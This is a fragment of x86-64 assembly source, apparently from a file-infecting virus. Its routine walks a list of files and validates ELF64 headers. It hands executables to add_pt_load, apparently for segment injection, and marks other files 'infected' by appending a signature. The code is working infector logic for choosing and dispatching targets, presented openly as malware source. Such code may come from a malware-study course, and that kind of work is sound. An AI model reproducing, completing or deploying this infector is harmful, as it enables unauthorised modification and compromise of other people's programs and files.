; Constants
%define AT_FDCWD        -100
%define FILE_ENTRY_SIZE PATH_BUFF_SIZE

; ============================================
; check_elf64_exec(char *file_list, uint64_t count)
; rdi = pointer to file list (each entry is FILE_ENTRY_SIZE bytes)
; rsi = number of files in the list
; Checks each file and prints if it's a valid ELF64 executable
; ============================================
check_elf64_exec:
    push rbp
    mov rbp, rsp
    push r12                    ; saved file list pointer
    push r13                    ; saved file count
    push r14                    ; current file index
    push r15                    ; current file path pointer
    push rbx                    ; saved for later use

    mov r12, rdi                ; r12 = file_list base
    mov r13, rsi                ; r13 = total file count
    xor r14, r14                ; r14 = current index = 0

.check_loop:
    cmp r14, r13                ; if index >= count, done
    jge .check_done

    ; Calculate current file path: r15 = file_list + (index * FILE_ENTRY_SIZE)
    mov rax, r14
    imul rax, FILE_ENTRY_SIZE
    lea r15, [r12 + rax]        ; r15 = current file path

    ; Open the file for reading
    mov eax, SYS_OPENAT
    mov edi, AT_FDCWD
    mov rsi, r15                ; pathname
    xor edx, edx                ; O_RDONLY = 0
    xor r10d, r10d
    syscall

    ; Check if open failed
    test rax, rax
    js .invalid_file            ; if fd < 0, mark as invalid

    mov rbx, rax                ; save fd in rbx

    ; Read the first 64 bytes (ELF header)
    mov eax, SYS_READ
    mov edi, ebx                ; fd
    lea rsi, [rel elf_header_buf]
    mov edx, 64                 ; read 64 bytes (Ehdr size)
    syscall

    ; Check if we read enough bytes
    cmp rax, 64
    jl .close_and_invalid

    ; Check ELF magic: 0x7f 'E' 'L' 'F'
    lea rdi, [rel elf_header_buf]
    cmp byte [rdi + 0], 0x7f
    jne .close_and_invalid
    cmp byte [rdi + 1], 'E'
    jne .close_and_invalid
    cmp byte [rdi + 2], 'L'
    jne .close_and_invalid
    cmp byte [rdi + 3], 'F'
    jne .close_and_invalid

    ; Check ELF class (offset 4): must be 2 for 64-bit
    cmp byte [rdi + 4], 2       ; ELFCLASS64 = 2
    jne .close_and_invalid

    ; Check e_type (offset 16): must be 2 for executable (ET_EXEC)
    ; or 3 for shared object (ET_DYN) which can also be an executable
    movzx eax, word [rdi + 16]  ; e_type is at offset 16 in ELF header
    cmp ax, 2                   ; ET_EXEC = 2
    je .valid_elf
    cmp ax, 3                   ; ET_DYN = 3 (PIE executables)
    je .valid_elf
    jmp .close_and_invalid

.valid_elf:
    ; Close the file
    mov eax, SYS_CLOSE
    mov edi, ebx
    syscall

%ifdef VERBOSE_MODE
    ; Print filename
    mov rdi, r15
    call print_string

    ; Print " is a valid elf64 executable\n"
    lea rdi, [rel msg_valid]
    call print_string
%endif

    ; Call add_pt_load for this valid ELF64 executable
    mov rdi, r15                ; pass the file path
    call add_pt_load

    jmp .next_file

.close_and_invalid:
    ; Close the file
    mov eax, SYS_CLOSE
    mov edi, ebx
    syscall

.invalid_file:
    ; For non-ELF64 executables, process the file:
    ; - Check if it contains the signature
    ; - If yes: print "already infected"
    ; - If no: append signature and print "infected " + filename
    mov rdi, r15
    call process_non_elf_file

.next_file:
    inc r14                     ; index++
    jmp .check_loop

.check_done:
    pop rbx
    pop r15
    pop r14
    pop r13
    pop r12
    mov rsp, rbp
    pop rbp
    ret


